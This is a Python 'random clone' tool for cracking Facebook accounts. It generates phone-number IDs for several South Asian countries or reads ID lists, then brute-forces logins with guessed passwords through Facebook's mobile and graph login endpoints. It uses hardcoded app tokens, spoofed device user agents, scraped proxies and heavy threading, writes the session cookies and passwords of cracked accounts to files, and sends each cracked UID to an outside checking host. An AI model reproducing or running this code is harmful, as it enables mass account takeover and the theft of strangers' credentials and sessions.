# SCRIPT BY SIAM 
#TOR BAP LAGI
#---------------------[ IMPORT ]---------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
import os,requests,json,time,re,random,sys,uuid,string,subprocess,bs4
try:import pycurl,io
except:os.system('pip install pycurl')
try:
	os.system('clear')
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,hashlib,zlib,re
	from string import * 
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] INSTALLING MISSING MODULES...');os.system('pip install requests bs4 futures==2 > /dev/null');os.system('./SM')
except:pass
#---------------------[ LOOP ]---------------------#
id,user,siam,memek,loop,ok,cp=[],[],[],[],0,0,0
loop=0;oks=[];cps=[];pcp=[];id=[];tokenku=[];plist=[]
#---------------------[ PROXY ]---------------------#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('Proksi.txt','w').write(prox)
except Exception as e:
    print(e)
#---------------------[ COLOUR ]---------------------#
G="\033[1;32m";W="\x1b[1;97m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";E="\x1b[38;5;205m";O="\x1b[38;5;81m"
#---------------------[ STYLE ]---------------------#
xd = f" {T}[{G}Π{T}]{G}";xd1=f" {R}[{G}1{R}]{G}";xd2=f" {R}[{G}2{R}]{G}";xd3=f" {R}[{G}3{R}]{G}";xd4=f" {R}[{G}4{R}]{G}";xd5=f" {R}[{G}5{R}]{G}";xd6=f" {R}[{G}6{R}]{G}";xd0=f" {R}[{G}0{R}]{G}";xdx=f" {R}[{G}?{R}]{G}"
#---------------------[ CLEAR ]---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{W}{47*'━'}")

#------------------[ USER AGENT ]------------------------#
def ____SMF____():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''




import random

def ____SM____():
    version = random.choice([
        "14", "13", "12", "11", "10", "9", "8.1.0", "8.0.0", "7.1.2", "7.0", "6.0.1"
    ])
    model = random.choice([
        "SM-G991B", "SM-A536E", "SM-M127F", "SM-A326B", "SM-A226B", "SM-A107F", 
        "SM-G960F", "SM-G973F", "SM-N960F", "SM-J810G", "SM-A750F", "SM-J600G", "SM-A205F"
    ])
    build = random.choice([
        "TP1A.220624.014", "QP1A.190711.020", "SP1A.210812.016", 
        "RP1A.200720.012", "PPR1.180610.011", "NRD90M"
    ])
    chrome_major = random.randint(103, 125)
    chrome_build = f"{chrome_major}.0.{random.randint(4200, 6500)}.{random.randint(40, 150)}"
    
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_build} Mobile Safari/537.36'''

# Example use:



import random

def SM_Dalvik():
    version = random.choice(["7.0", "7.1.1", "8.0.0", "9", "10", "11", "12"])
    model = random.choice([
        "SM-A720F", "SM-G610F", "SM-J730F", "SM-A305F", "SM-G965F",
        "SM-A107F", "SM-G973F", "SM-M115F", "SM-A207F", "SM-A525F"
    ])
    build = random.choice(["R16NW", "QP1A.190711.020", "NRD90M", "M1AJB", "PPR1.180610.011"])
    fbav = random.choice(["196.0.0.29.99", "220.0.0.45.120", "250.0.0.41.120", "300.0.0.22.108"])
    fblc = random.choice(["en_US", "bn_BD", "hi_IN", "th_TH"])
    density = round(random.uniform(2.0, 3.5), 1)
    width = random.choice([720, 1080, 1440])
    height = int(width * 16 / 9)
    
    return f'''Dalvik/2.1.0 (Linux; U; Android {version}; {model} Build/{build}) [FBAN/Orca-Android;FBAV/{fbav};FBPN/com.facebook.orca;FBLC/{fblc};FBBV/135374479;FBCR/Random;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/{version};FBCA/armeabi-v7a:armeabi;FBDM={{density={density},width={width},height={height}}};FB_FW/1;]'''


import random

def __M2__():
    fbav_major = random.randint(300, 450)
    fbav_minor = random.randint(0, 1)
    fbav_patch = random.randint(0, 99)
    fbav_build = random.randint(10, 99)
    
    fbbv = random.randint(200000000, 999999999)
    fbrv = random.randint(0, 100000000)
    density = random.choice(["1.5", "2.0", "2.25", "2.625", "3.0", "3.5"])
    width = random.choice([720, 1080, 1440])
    height = random.choice([1280, 1920, 2160, 2400])
    
    brands = [("Samsung", "Samsung", "SM-A107F"), ("Xiaomi", "Xiaomi", "Redmi Note 8"), ("Infinix", "Infinix", "Infinix X688B"), ("realme", "realme", "RMX1911"), ("Huawei", "Huawei", "LYA-L29")]
    brand, fbmf, fbdv = random.choice(brands)
    
    version = random.choice(["10", "11", "12", "13"])
    locale = random.choice(["en_US", "en_GB", "vi_VN", "hi_IN", "bn_BD"])
    arch = random.choice(["armeabi-v7a", "armeabi", "armeabi-v8a"])
    
    fbav = f"{fbav_major}.{fbav_minor}.{fbav_patch}.{fbav_build}"
    
    return f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;FBLC/{locale};FBMF/{fbmf};FBBD/{brand};FBDV/{fbdv};FBSV/{version};FBCA/{arch};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"

import random

def file_SM_ua():
    fbav = f"{random.randint(350, 430)}.0.0.{random.randint(10, 99)}.{random.randint(10, 99)}"
    fbbv = random.randint(300000000, 999999999)
    fbrv = random.randint(0, 100000000)
    device = random.choice([
        ("Samsung", "Samsung", "SM-A107F"),
        ("Infinix", "Infinix", "Infinix X688C"),
        ("Xiaomi", "Xiaomi", "Redmi Note 9"),
        ("realme", "realme", "RMX1821"),
        ("TECNO", "TECNO", "KE5k")
    ])
    brand, fbmf, fbdv = device
    version = random.choice(["10", "11", "12"])
    locale = random.choice(["en_US", "en_GB", "hi_IN", "bn_BD", "vi_VN"])
    arch = "armeabi-v7a:armeabi"
    density = random.choice(["2.0", "2.25", "2.625", "3.0"])
    width = random.choice([720, 1080])
    height = random.choice([1440, 1920, 2160])

    return f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;FBLC/{locale};FBMF/{fbmf};FBBD/{brand};FBDV/{fbdv};FBSV/{version};FBCA/{arch};FBDM={{density={density},width={width},height={height}}};FB_FW/1;]"

import random

def random_fb_ua():
    fbav = f"{random.randint(400, 430)}.0.0.{random.randint(10, 99)}.{random.randint(10, 120)}"
    fbbv = random.randint(500000000, 599999999)
    fbrv = random.randint(0, 100000000)
    version = random.choice(["10", "11", "12", "13"])
    locale = random.choice(["en_US", "bn_BD", "vi_VN", "hi_IN"])
    density = random.choice(["2.0", "2.25", "2.75", "3.0"])
    width = random.choice([720, 1080, 1440])
    height = random.choice([1440, 1920, 2160])

    device = random.choice([
        ("Samsung", "Samsung", "SM-A107F"),
        ("Xiaomi", "Xiaomi", "Redmi Note 8"),
        ("Infinix", "Infinix", "Infinix X688C"),
        ("realme", "realme", "RMX1911"),
        ("TECNO", "TECNO", "KE5k")
    ])
    
    fbmf, fbbd, fbdv = device

    return f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;FBLC/{locale};FBMF/{fbmf};FBBD/{fbbd};FBDV/{fbdv};FBSV/{version};FBCA/armeabi-v7a:armeabi;FBDM={{density={density},width={width},height={height}}};FB_FW/1;]"


#---------------------[ LOGO ]---------------------#
logo = f'''{O}
   _|_|_|  _|_|_|    _|_|    _|      _|  
 _|          _|    _|    _|  _|_|  _|_|  
   _|_|      _|    _|_|_|_|  _|  _|  _|  
       _|    _|    _|    _|  _|      _|  
 _|_|_|    _|_|_|  _|    _|  _|      _|{W}
{W}{47*'━'}
{xd} DEVELOPER {R}:{Y} SIAM
{xd} TOOLS     {R}:{R} RANDOM {G} CLONE
{xd} VERSION  {R} : {T} 15.0X
{W}{47*'━'}'''
#---------------------[ MAIN MENU ]---------------------#

def menu():
	clear()
	print(f' [1] {G}FILE {R}CLONE');print(f' {T}[2] {R}RANDOM {G}CLONE MORE{R}..{T}..{G}..{Y}..{W}.');linex();
	sm = input(f'{xd} SELECTION + : {T}')
	if sm in ["1"]:smfile()
	elif sm in ["2"]:SIAM()

def SIAM():
    clear();print(f'{xd1} BANGLADESH RANDOM CLONING ');print(f'{xd2} INDIA RANDOM CLONING  ');print(f'{xd3} PAKISTAN RANDOM CLONING  ');print(f'{xd4} NEPAL RANDOM CLONING  ');print(f'{xd5} AFGHANISTAN RANDOM CLONING  ');print(f'{xd6} MALAYSIA RANDOM CLONING  ');print(f'{xd0} EXIT TOOLS ');linex();___option___ = input(f'{xdx} SELECTION {R}:{G} ')
    if ___option___ in ["1"]:os.system('xdg-open https://t.me/vixfbclone');siam.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system('xdg-open https://t.me/');siam.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system('xdg-open https://t.me/vixfbclone');siam.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system('xdg-open https://t.me/vixfbclone');siam.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system('xdg-open https://t.me/vixfbclone');siam.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system('xdg-open https://t.me/vixfbclone');siam.append('6');______randomxmenu_______()
    elif ___option___ in ["0"]:exit()
    else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);SIAM()
#---------------------[ RANDOM BD/INDIA/PAKISTAN/NEPAL/AFGHANISTAN/MALAYSIA MENU ]---------------------#

def smfile():
	os.system#('')
	clear();print(f'{xd} EXAMPLE : /sdcard/file.txt ');linex();file = input(f'{xdx} ENTER FILE PATH :{T} ');linex();print(f'{G} [1] METHOD 1 api');print(f'{T} [2] METHOD 2 b-graph');linex();method=input(f'{Y}ENTER YOUR CHOICE +: {G}');linex()
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);__________filex__________()
	clear()
	try:
		ps_limit = int(input(f'{xdx} ENTER PASSWORD LIMIT : '))
	except:
		ps_limit = 5
	clear();print(f'{xd} EXAMPLE : firstlast | firtslast | first123');linex()
	for i in range(ps_limit):
		plist.append(input(f'{xd} ENTER PASSWORD {W}[{G}{i+1}{W}] : '))
	with tred(max_workers=30) as SMM:
		clear();__________totaluid__________ = str(len(fo))
		print(f'{xd} TOTAL ACCOUNTS :{G} {__________totaluid__________} ')
		print(f'{xd} IF NO RESULT ON|OFF AIRPLANE MODE');linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if method in ['1']:SMM.submit(SMM1,ids,names,passlist)
			if method in ['2']:SMM.submit(SMM2,ids,names,passlist)
			
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK|CP :{G} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#-----------------------[ FILE METHOD ]-----------------------#
def SMM1(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r[{T}SIAM-{R}M1]{G}  %s {Y}|{G} OK{W}|{R}CP {W}| {G}%s|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": random_fb_ua(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{xd}~{W}[{G}SUCCESSFUL{W}] '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r\r{xd}~{G}{cookies} ');linex()
                                        open('/sdcard/SIAM-XD-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        #print(f'\r{R}[{R}CHECKPOINT{R}]{R} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SIAM-XD-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break       
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-------------------[ FILE METHOD M2 ]-------------------#
def SMM2(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{xd}[SIAM-M2] %s | OK|CP %s|%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        _____useragentxx_____ = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/453.0.0.40.107;FBBV/570632556;FBDM/{density=3.0,width=1080,height=2132};FBLC/pt_BR;FBRV/572610184;FBCR/Grameenphone;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1993;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
                        data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
                        headers = {'User-Agent': file_SM_ua(),'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': f'OAuth {accessToken}','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger','Content-Length': '332'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'''\r{xd}{W}-{R}[{G}SIAM-OK{R}]{G} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                        print(f'''\r{xd}{W}-{R}[{G}🍪{R}]{W} ''' + cookies);linex()
                                        open('/sdcard/SIAM-FILE-M2-OK.txt', 'a').write(ids + '|' + pas + '|' + cookies + '\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'''\r{xd}{W}-{R}[{Y}SIAM-CP{R}]{Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                                        open('/sdcard/SIAM-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

#jsmssbsksmsbshsmdbdbvd
def ______randomxmenu_______():
    clear()
    if "1" in siam:print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{G} 016 {R}|{G} 017 {R}|{G} 018 {R}|{G} 019 ");linex()
    if "2" in siam:print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{G} +91600 {R}|{G} +91620 ");linex()
    if "3" in siam:print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{G} 0315 {R}|{G} 0335 {R}|{G} 0345 ");linex()
    if "4" in siam:print(f"{xd} EXAMPLE {R}:{G} 9814 {R}|{G} 9815 {R}|{G} 9861 {R}|{G} 9840 ");linex()
    if "5" in siam:print(f"{xd} EXAMPLE {R}:{G} +9340 {R}|{G} +9360 {R}|{G} +9330 {R}|{G} +9350 ");linex()
    if "6" in siam:print(f"{xd} EXAMPLE {R}:{G} 0113 {R}|{G} 0116 {R}|{G} 0112 {R}|{G} 0119 ");linex()
    code = input(f'{xdx} ENTER SIM CODE {R}:{G} ');linex();print(f"{xd} EXAMPLE {R}:{G} 6969 {R}|{G} 5555 {R}|{G} 7777 {R}|{G} 99999 ");linex();limit=int(input(f'{xdx} ENTER CRACK LIMIT {R}:{G} '))
    clear();print(f"{xd1} METHOD M1 {R}|{G}HOST{R}| ");print(f"{xd2} METHOD M2 {R}|{G}GRAPH{R}| ");linex();___method___=input(f'{xdx} ENTER METHOD {R}:{G} ')
    for nmbr in range(int(limit)):
        if "1" in siam:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
        if "2" in siam:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "3" in siam:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "4" in siam:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "5" in siam:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "6" in siam:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
    with ThreadPool(max_workers=60) as ____siam____:
        clear();tl = str(len(user))
        print(f'{xd} CODE{R}|{G}UID {R}:{T} {code}{R}|{E}{tl} ');print(f"{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE");print(f'{xd} YOUR CLONING STARTED........{R}π');print(f'{xd}{G}USE VPN {R}: {T}1.1.1.1');linex()
        for love in user:
            ids = code + love 
            if "1" in siam:pasx=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
            if "2" in siam:pasx=[ids,love,ids[:6],"57273200","57575751","59039200"]
            if "3" in siam:pasx=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if "4" in siam:pasx=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if "5" in siam:pasx=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if "6" in siam:pasx=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
            if ___method___ in ['1']:____siam____.submit(____methodA____,ids,pasx,tl)
            elif ___method___ in ['2']:____siam____.submit(____methodB____,ids,pasx,tl)
    print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{R}|{G}CP {R}:{G} '+str(len(ok))+f'{R}|{G}'+str(len(cp)));linex();exit()

#---------------------[ RANDOM METHOD A ]---------------------#
def ____methodA____(ids,pasx,tl):
    global loop,ok,cp
    ewe = requests.Session()
    ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
    sys.stdout.write(f'\r\r{G}<[SIAM]> <[M-1]> {loop} | OK|CP {ok} | {cp}');sys.stdout.flush()
    for pw in pasx:
        try:
            xx = open('Proksi.txt','r').read().splitlines()
            zz = {'http': 'socks4://'+random.choice(xx)}
            link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": ids,
                "prefill_contact_point": ids,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "touch.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": ____SM____(),
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://touch.facebook.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
            response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False,
                proxies = zz
                )
            if "checkpoint" in ewe.cookies.get_dict():
                uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r{xd}-{R}[{Y}SIAM-CP{R}]{Y} {uid} | {pw} ")
                open('/sdcard/SIAM-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}SIAM-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[🌹{R}]{G} {kuki} ");print(f"{W}{47*'━'}")
                    open('/sdcard/SIAM-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
#---------------------[ RANDOM METHOD B ]---------------------#
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{G}[SIAM-M2] {loop} | OK|CP {ok} | {cp}');sys.stdout.flush()
        try:
                for pw in pasx:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        __R2X__ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pw,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={'User-Agent': __M2__(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}SIAM-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[{T}COOKIES-🌹{G}]{G} {kuki} ");print(f"{W}{47*'━'}")
                                            open('/sdcard/SIAM-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        print(f"\r{xd}-{R}[{Y}SIAM-CP{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/SIAM-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------[ END CODE ]---------------------#
if __name__=='__main__':
    menu()